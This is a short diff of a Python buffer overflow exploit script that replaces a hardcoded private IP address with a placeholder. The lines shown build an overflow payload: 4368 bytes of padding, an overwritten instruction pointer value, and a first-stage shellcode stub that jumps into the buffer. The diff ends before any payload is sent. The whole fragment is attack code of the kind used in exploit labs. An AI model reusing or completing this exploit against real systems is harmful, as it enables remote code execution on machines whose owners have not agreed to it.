@@ -1,6 +1,6 @@
 #!/usr/bin/python
 import socket
-host = "192.168.177.44"
+host = "*IP*"
 padding = "\x41" * 4368
 eip = "\x96\x45\x13\x08"
 first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
